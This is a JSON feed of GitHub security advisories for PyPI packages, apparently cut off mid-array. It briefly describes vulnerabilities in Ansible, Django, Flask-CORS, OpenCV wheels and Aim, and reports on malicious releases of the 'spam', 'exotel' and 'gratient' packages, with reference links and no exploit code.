{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<p>An input validation vulnerability was found in Ansible's mysql_user module before 2.2.1.0, which may fail to correctly change a password in certain circumstances. Thus the previous password would still be active when it should have been changed.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-8647\">https://nvd.nist.gov/vuln/detail/CVE-2016-8647</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x4cm-m36h-c6qj\">https://github.com/advisories/GHSA-x4cm-m36h-c6qj</a></li>\n<li><a href=\"https://github.com/ansible/ansible-modules-core/pull/5388\">https://github.com/ansible/ansible-modules-core/pull/5388</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2017:1685\">https://access.redhat.com/errata/RHSA-2017:1685</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2016-8647\">https://access.redhat.com/security/cve/CVE-2016-8647</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1396174\">https://bugzilla.redhat.com/show_bug.cgi?id=1396174</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-8647\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-8647</a></li>\n<li><a href=\"https://github.com/ansible/ansible-modules-core/commit/30fb384e7fb9a94ac3929e4a650877e45d8834c9\">https://github.com/ansible/ansible-modules-core/commit/30fb384e7fb9a94ac3929e4a650877e45d8834c9</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2018-58.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2018-58.yaml</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x4cm-m36h-c6qj",
            "title": "[ansible] Improper Input Validation in ansible",
            "date_modified": "2024-09-03T21:00:20.000Z",
            "date_published": "2018-10-10T17:23:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x4cm-m36h-c6qj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An issue was discovered in the HTTP FileResponse class in Django 3.2 before 3.2.15 and 4.0 before 4.0.7. An application is vulnerable to a reflected file download (RFD) attack that sets the Content-Disposition header of a FileResponse when the filename is derived from user-supplied input.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-36359\">https://nvd.nist.gov/vuln/detail/CVE-2022-36359</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2022-245.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2022-245.yaml</a></li>\n<li><a href=\"https://groups.google.com/g/django-announce/c/8cz--gvaJr4\">https://groups.google.com/g/django-announce/c/8cz--gvaJr4</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/08/03/1\">http://www.openwall.com/lists/oss-security/2022/08/03/1</a></li>\n<li><a href=\"https://www.debian.org/security/2022/dsa-5254\">https://www.debian.org/security/2022/dsa-5254</a></li>\n<li><a href=\"https://github.com/django/django/commit/b3e4494d759202a3b6bf247fd34455bf13be5b80\">https://github.com/django/django/commit/b3e4494d759202a3b6bf247fd34455bf13be5b80</a></li>\n<li><a href=\"https://github.com/django/django/commit/b7d9529cbe0af4adabb6ea5d01ed8dcce3668fb3\">https://github.com/django/django/commit/b7d9529cbe0af4adabb6ea5d01ed8dcce3668fb3</a></li>\n<li><a href=\"https://github.com/django/django/commit/bd062445cffd3f6cc6dcd20d13e2abed818fa173\">https://github.com/django/django/commit/bd062445cffd3f6cc6dcd20d13e2abed818fa173</a></li>\n<li><a href=\"https://docs.djangoproject.com/en/4.0/releases/security\">https://docs.djangoproject.com/en/4.0/releases/security</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HWY6DQWRVBALV73BPUVBXC3QIYUM24IK\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/HWY6DQWRVBALV73BPUVBXC3QIYUM24IK</a></li>\n<li><a href=\"https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LTZVAKU5ALQWOKFTPISE257VCVIYGFQI\">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/LTZVAKU5ALQWOKFTPISE257VCVIYGFQI</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20220915-0008\">https://security.netapp.com/advisory/ntap-20220915-0008</a></li>\n<li><a href=\"https://www.djangoproject.com/weblog/2022/aug/03/security-releases\">https://www.djangoproject.com/weblog/2022/aug/03/security-releases</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8x94-hmjh-97hq\">https://github.com/advisories/GHSA-8x94-hmjh-97hq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8x94-hmjh-97hq",
            "title": "[Django] Django vulnerable to Reflected File Download attack ",
            "date_modified": "2024-09-03T14:59:11.000Z",
            "date_published": "2022-08-11T14:49:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8x94-hmjh-97hq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A vulnerability in corydolphin/flask-cors version 4.0.1 allows the <code>Access-Control-Allow-Private-Network</code> CORS header to be set to true by default, without any configuration option. This behavior can expose private network resources to unauthorized external access, leading to significant security risks such as data breaches, unauthorized access to sensitive information, and potential network intrusions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6221\">https://nvd.nist.gov/vuln/detail/CVE-2024-6221</a></li>\n<li><a href=\"https://huntr.com/bounties/a42935fc-6f57-4818-bca4-3d528235df4d\">https://huntr.com/bounties/a42935fc-6f57-4818-bca4-3d528235df4d</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/flask-cors/PYSEC-2024-71.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/flask-cors/PYSEC-2024-71.yaml</a></li>\n<li><a href=\"https://github.com/corydolphin/flask-cors/issues/362\">https://github.com/corydolphin/flask-cors/issues/362</a></li>\n<li><a href=\"https://github.com/corydolphin/flask-cors/pull/363\">https://github.com/corydolphin/flask-cors/pull/363</a></li>\n<li><a href=\"https://github.com/corydolphin/flask-cors/pull/368\">https://github.com/corydolphin/flask-cors/pull/368</a></li>\n<li><a href=\"https://github.com/corydolphin/flask-cors/commit/c8514760cf03fcce16d77f6db7007aad429c4548\">https://github.com/corydolphin/flask-cors/commit/c8514760cf03fcce16d77f6db7007aad429c4548</a></li>\n<li><a href=\"https://github.com/corydolphin/flask-cors/releases\">https://github.com/corydolphin/flask-cors/releases</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hxwh-jpp2-84pm\">https://github.com/advisories/GHSA-hxwh-jpp2-84pm</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hxwh-jpp2-84pm",
            "title": "[flask-cors] Flask-CORS allows the `Access-Control-Allow-Private-Network` CORS header to be set to true by default",
            "date_modified": "2024-09-03T14:44:53.000Z",
            "date_published": "2024-08-18T21:31:07.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hxwh-jpp2-84pm"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>spam</code> project on PyPI was taken over via user account compromise via a phishing attack and a new malicious release made which contained code which some environment variables and downloaded and ran malware at install time</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/spam/PYSEC-2022-251.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/spam/PYSEC-2022-251.yaml</a></li>\n<li><a href=\"https://twitter.com/pypi/status/1562442207079976966\">https://twitter.com/pypi/status/1562442207079976966</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2r6g-7r83-jg72\">https://github.com/advisories/GHSA-2r6g-7r83-jg72</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2r6g-7r83-jg72",
            "title": "[spam] `spam` project on PyPI compromised, malicious releases made",
            "date_modified": "2024-08-30T23:37:37.000Z",
            "date_published": "2024-08-30T23:37:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2r6g-7r83-jg72"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The <code>spam</code> project on PyPI was taken over via user account compromise via a phishing attack and a new malicious release made which contained code which some environment variables and downloaded and ran malware at install time</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/spam/PYSEC-2022-251.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/spam/PYSEC-2022-251.yaml</a></li>\n<li><a href=\"https://twitter.com/pypi/status/1562442207079976966\">https://twitter.com/pypi/status/1562442207079976966</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2r6g-7r83-jg72\">https://github.com/advisories/GHSA-2r6g-7r83-jg72</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2r6g-7r83-jg72",
            "title": "[spam] `spam` project on PyPI compromised, malicious releases made",
            "date_modified": "2024-08-30T23:37:37.000Z",
            "date_published": "2024-08-30T23:37:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2r6g-7r83-jg72"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>In Gentoo Portage before 3.0.47, there is missing PGP validation of executed code: the standalone emerge-webrsync downloads a .gpgsig file but does not perform signature verification.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-20021\">https://nvd.nist.gov/vuln/detail/CVE-2016-20021</a></li>\n<li><a href=\"https://bugs.gentoo.org/597800\">https://bugs.gentoo.org/597800</a></li>\n<li><a href=\"https://gitweb.gentoo.org/proj/portage.git/tree/NEWS\">https://gitweb.gentoo.org/proj/portage.git/tree/NEWS</a></li>\n<li><a href=\"https://wiki.gentoo.org/wiki/Portage\">https://wiki.gentoo.org/wiki/Portage</a></li>\n<li><a href=\"https://github.com/gentoo/portage/commit/28cd240fb23d880b8641a058831c6762db71c3e2\">https://github.com/gentoo/portage/commit/28cd240fb23d880b8641a058831c6762db71c3e2</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/portage/PYSEC-2024-10.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/portage/PYSEC-2024-10.yaml</a></li>\n<li><a href=\"https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=5b3c80502e96406b4b175e2ee79eb65f3f3cd9f6\">https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=5b3c80502e96406b4b175e2ee79eb65f3f3cd9f6</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pw5x-x5jw-ccmh\">https://github.com/advisories/GHSA-pw5x-x5jw-ccmh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pw5x-x5jw-ccmh",
            "title": "[portage] Gentoo Portage missing PGP validation of executed code",
            "date_modified": "2024-08-30T23:37:36.000Z",
            "date_published": "2024-01-12T03:30:49.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pw5x-x5jw-ccmh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A HTTP/2 implementation built using any version of the Python priority library prior to version 1.2.0 could be targeted by a malicious peer by having that peer assign priority information for every possible HTTP/2 stream ID. The priority tree would happily continue to store the priority information for each stream, and would therefore allocate unbounded amounts of memory. Attempting to actually use a tree like this would also cause extremely high CPU usage to maintain the tree.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-6580\">https://nvd.nist.gov/vuln/detail/CVE-2016-6580</a></li>\n<li><a href=\"https://python-hyper.org/priority/en/latest/security/CVE-2016-6580.html\">https://python-hyper.org/priority/en/latest/security/CVE-2016-6580.html</a></li>\n<li><a href=\"https://github.com/python-hyper/priority/commit/7d01a7dc4db83bce50f20d47caf4f37b403a3ecd\">https://github.com/python-hyper/priority/commit/7d01a7dc4db83bce50f20d47caf4f37b403a3ecd</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/priority/PYSEC-2017-93.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/priority/PYSEC-2017-93.yaml</a></li>\n<li><a href=\"https://web.archive.org/web/20160806004329/http://www.securityfocus.com/bid/92311\">https://web.archive.org/web/20160806004329/http://www.securityfocus.com/bid/92311</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h3q4-6j7f-r24c\">https://github.com/advisories/GHSA-h3q4-6j7f-r24c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h3q4-6j7f-r24c",
            "title": "[priority] priority vulnerable to denial of service",
            "date_modified": "2024-08-30T23:37:26.000Z",
            "date_published": "2022-05-17T03:02:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h3q4-6j7f-r24c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>opencv-python versions before v4.8.1.78 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-4863. opencv-python v4.8.1.78 upgrades the bundled libwebp binary to v1.3.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-4863\">https://nvd.nist.gov/vuln/detail/CVE-2023-4863</a></li>\n<li><a href=\"https://github.com/opencv/opencv/pull/24274\">https://github.com/opencv/opencv/pull/24274</a></li>\n<li><a href=\"https://github.com/opencv/opencv/commit/687fc11626901cff09d2b3b5f331fd59190ad4c7\">https://github.com/opencv/opencv/commit/687fc11626901cff09d2b3b5f331fd59190ad4c7</a></li>\n<li><a href=\"https://github.com/opencv/opencv/wiki/ChangeLog#version481\">https://github.com/opencv/opencv/wiki/ChangeLog#version481</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/opencv-python/PYSEC-2023-183.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/opencv-python/PYSEC-2023-183.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qr4w-53vh-m672\">https://github.com/advisories/GHSA-qr4w-53vh-m672</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qr4w-53vh-m672",
            "title": "[opencv-python] opencv-python bundled libwebp binaries in wheels that are vulnerable to CVE-2023-4863",
            "date_modified": "2024-08-30T23:37:22.000Z",
            "date_published": "2024-08-30T23:37:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qr4w-53vh-m672"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>opencv-contrib-python versions before v4.8.1.78 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-4863. opencv-contrib-python v4.8.1.78 upgrades the bundled libwebp binary to v1.3.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-4863\">https://nvd.nist.gov/vuln/detail/CVE-2023-4863</a></li>\n<li><a href=\"https://github.com/opencv/opencv/pull/24274\">https://github.com/opencv/opencv/pull/24274</a></li>\n<li><a href=\"https://github.com/opencv/opencv/commit/687fc11626901cff09d2b3b5f331fd59190ad4c7\">https://github.com/opencv/opencv/commit/687fc11626901cff09d2b3b5f331fd59190ad4c7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j7hp-h8jx-5ppr\">https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</a></li>\n<li><a href=\"https://github.com/opencv/opencv/wiki/ChangeLog#version481\">https://github.com/opencv/opencv/wiki/ChangeLog#version481</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/opencv-contrib-python/PYSEC-2023-181.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/opencv-contrib-python/PYSEC-2023-181.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cxjf-x6jp-p7mc\">https://github.com/advisories/GHSA-cxjf-x6jp-p7mc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cxjf-x6jp-p7mc",
            "title": "[opencv-contrib-python] opencv-contrib-python bundled libwebp binaries in wheels that are vulnerable to CVE-2023-4863",
            "date_modified": "2024-08-30T23:37:21.000Z",
            "date_published": "2024-08-30T23:37:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cxjf-x6jp-p7mc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>opencv-python-headless versions before v4.8.1.78 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-4863. opencv-python-headless v4.8.1.78 upgrades the bundled libwebp binary to v1.3.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-4863\">https://nvd.nist.gov/vuln/detail/CVE-2023-4863</a></li>\n<li><a href=\"https://github.com/opencv/opencv/pull/24274\">https://github.com/opencv/opencv/pull/24274</a></li>\n<li><a href=\"https://github.com/opencv/opencv/commit/687fc11626901cff09d2b3b5f331fd59190ad4c7\">https://github.com/opencv/opencv/commit/687fc11626901cff09d2b3b5f331fd59190ad4c7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j7hp-h8jx-5ppr\">https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</a></li>\n<li><a href=\"https://github.com/opencv/opencv/wiki/ChangeLog#version481\">https://github.com/opencv/opencv/wiki/ChangeLog#version481</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/opencv-python-headless/PYSEC-2023-184.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/opencv-python-headless/PYSEC-2023-184.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jh2j-j4j9-crg3\">https://github.com/advisories/GHSA-jh2j-j4j9-crg3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jh2j-j4j9-crg3",
            "title": "[opencv-python-headless] opencv-python-headless bundled libwebp binaries in wheels that are vulnerable to CVE-2023-4863",
            "date_modified": "2024-08-30T23:37:21.000Z",
            "date_published": "2024-08-30T23:37:17.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jh2j-j4j9-crg3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>opencv-contrib-python-headless versions before v4.8.1.78 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-4863. opencv-contrib-python-headless v4.8.1.78 upgrades the bundled libwebp binary to v1.3.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-4863\">https://nvd.nist.gov/vuln/detail/CVE-2023-4863</a></li>\n<li><a href=\"https://github.com/opencv/opencv/pull/24274\">https://github.com/opencv/opencv/pull/24274</a></li>\n<li><a href=\"https://github.com/opencv/opencv/commit/687fc11626901cff09d2b3b5f331fd59190ad4c7\">https://github.com/opencv/opencv/commit/687fc11626901cff09d2b3b5f331fd59190ad4c7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j7hp-h8jx-5ppr\">https://github.com/advisories/GHSA-j7hp-h8jx-5ppr</a></li>\n<li><a href=\"https://github.com/opencv/opencv/wiki/ChangeLog#version481\">https://github.com/opencv/opencv/wiki/ChangeLog#version481</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/opencv-contrib-python-headless/PYSEC-2023-182.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/opencv-contrib-python-headless/PYSEC-2023-182.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w2pj-9cgh-mq2c\">https://github.com/advisories/GHSA-w2pj-9cgh-mq2c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w2pj-9cgh-mq2c",
            "title": "[opencv-contrib-python-headless] opencv-contrib-python-headless bundled libwebp binaries in wheels that are vulnerable to CVE-2023-4863",
            "date_modified": "2024-08-30T23:37:16.000Z",
            "date_published": "2024-08-30T23:37:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w2pj-9cgh-mq2c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>gratient is a user-facing library for generating color gradients of text.\nVersion 0.5 contained obfuscated, malicious code targeting\nWindows platforms, harvesting information and credentials from the\nuser's system and sending them to a remote server.\nServices may include Mullvad VPN and Telegram.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/gratient/PYSEC-2024-1.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/gratient/PYSEC-2024-1.yaml</a></li>\n<li><a href=\"https://inspector.pypi.io/project/gratient/0.5/packages/c5/c5/353e45fa57fa5f1b2b42fa24a029cdfb018d7263850fb43b6d6352157734/gratient-0.5-py3-none-any.whl/gratient/__init__.py#line.4\">https://inspector.pypi.io/project/gratient/0.5/packages/c5/c5/353e45fa57fa5f1b2b42fa24a029cdfb018d7263850fb43b6d6352157734/gratient-0.5-py3-none-any.whl/gratient/__init__.py#line.4</a></li>\n<li><a href=\"https://pypi.org/project/gratient\">https://pypi.org/project/gratient</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xm4r-5rj9-2pg3\">https://github.com/advisories/GHSA-xm4r-5rj9-2pg3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xm4r-5rj9-2pg3",
            "title": "[gratient] gratient 0.5 contains credential harvesting code",
            "date_modified": "2024-08-30T23:37:06.000Z",
            "date_published": "2024-08-30T23:37:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xm4r-5rj9-2pg3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The exotel project on PyPI was taken over via user account compromise via a phishing attack and a new malicious release made which contained code which some environment variables and downloaded and ran malware at install time</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/exotel/PYSEC-2022-250.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/exotel/PYSEC-2022-250.yaml</a></li>\n<li><a href=\"https://twitter.com/pypi/status/1562442207079976966\">https://twitter.com/pypi/status/1562442207079976966</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x6xg-3fj2-4pq3\">https://github.com/advisories/GHSA-x6xg-3fj2-4pq3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x6xg-3fj2-4pq3",
            "title": "[exotel] `exotel` project on PyPI compromised, malicious release made",
            "date_modified": "2024-08-30T23:37:00.000Z",
            "date_published": "2024-08-30T23:36:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x6xg-3fj2-4pq3"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The chroot, jail, and zone connection plugins in ansible before 1.9.2 allow local users to escape a restricted environment via a symlink attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2015-6240\">https://nvd.nist.gov/vuln/detail/CVE-2015-6240</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/952166f48eb0f5797b75b160fd156bbe1e8fc647\">https://github.com/ansible/ansible/commit/952166f48eb0f5797b75b160fd156bbe1e8fc647</a></li>\n<li><a href=\"https://github.com/ansible/ansible/commit/ca2f2c4ebd7b5e097eab0a710f79c1f63badf95b\">https://github.com/ansible/ansible/commit/ca2f2c4ebd7b5e097eab0a710f79c1f63badf95b</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1243468\">https://bugzilla.redhat.com/show_bug.cgi?id=1243468</a></li>\n<li><a href=\"https://lists.debian.org/debian-lts-announce/2019/09/msg00016.html\">https://lists.debian.org/debian-lts-announce/2019/09/msg00016.html</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2015/08/17/10\">http://www.openwall.com/lists/oss-security/2015/08/17/10</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2017-3.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/ansible/PYSEC-2017-3.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wwwh-47wp-m522\">https://github.com/advisories/GHSA-wwwh-47wp-m522</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wwwh-47wp-m522",
            "title": "[ansible] Ansible Sandbox Escape via Symlink Attack",
            "date_modified": "2024-08-30T22:01:32.000Z",
            "date_published": "2022-05-13T01:54:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wwwh-47wp-m522"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A path traversal attack aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.</p>\n<p>Vulnerable code: <a href=\"https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16\">https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16</a></p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability issue is resolved in Aim v3.1.0.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://owasp.org/www-community/attacks/Path_Traversal\">https://owasp.org/www-community/attacks/Path_Traversal</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aimhubio/aim/security/advisories/GHSA-8phj-f9w2-cjcc\">https://github.com/aimhubio/aim/security/advisories/GHSA-8phj-f9w2-cjcc</a></li>\n<li><a href=\"https://github.com/aimhubio/aim/pull/1003\">https://github.com/aimhubio/aim/pull/1003</a></li>\n<li><a href=\"https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16\">https://github.com/aimhubio/aim/blob/0b99c6ca08e0ba7e7011453a2f68033e9b1d1bce/aim/web/api/views.py#L9-L16</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-43775\">https://nvd.nist.gov/vuln/detail/CVE-2021-43775</a></li>\n<li><a href=\"https://github.com/aimhubio/aim/issues/999\">https://github.com/aimhubio/aim/issues/999</a></li>\n<li><a href=\"https://github.com/aimhubio/aim/commit/b9e53df5e32d14bbd3a2c738e2db7187fb531e93\">https://github.com/aimhubio/aim/commit/b9e53df5e32d14bbd3a2c738e2db7187fb531e93</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/aim/PYSEC-2021-839.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/aim/PYSEC-2021-839.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8phj-f9w2-cjcc\">https://github.com/advisories/GHSA-8phj-f9w2-cjcc</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8phj-f9w2-cjcc",
            "title": "[aim] Arbitrary file reading vulnerability in Aim",
            "date_modified": "2024-08-30T21:51:41.000Z",
            "date_published": "2021-11-23T22:03:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8phj-f9w2-cjcc"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Adyen has utility methods for validating notification HMAC signatures. The <code>is_valid_hmac</code> and <code>is_valid_hmac_notification</code> methods are vulnerable to a timing attack, you should compare the hash of the HMACs instead.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Adyen/adyen-python-api-library/issues/168\">https://github.com/Adyen/adyen-python-api-library/issues/168</a></li>\n<li><a href=\"https://github.com/Adyen/adyen-python-api-library/pull/170\">https://github.com/Adyen/adyen-python-api-library/pull/170</a></li>\n<li><a href=\"https://github.com/Adyen/adyen-python-api-library/commit/3292133dbc00ffc4cccfb92de672a76eaa587ca5\">https://github.com/Adyen/adyen-python-api-library/commit/3292133dbc00ffc4cccfb92de672a76eaa587ca5</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/adyen/PYSEC-2023-1.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/adyen/PYSEC-2023-1.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f3q4-ggfp-jv34\">https://github.com/advisories/GHSA-f3q4-ggfp-jv34</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f3q4-ggfp-jv34",
            "title": "[Adyen] Adyen APIs Library for Python timing attack vulnerability",
            "date_modified": "2024-08-30T18:51:59.000Z",
            "date_published": "2024-08-30T18:51:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f3q4-ggfp-jv34"
            },
            "tags": [
                "severity"
            ]
        },
        {
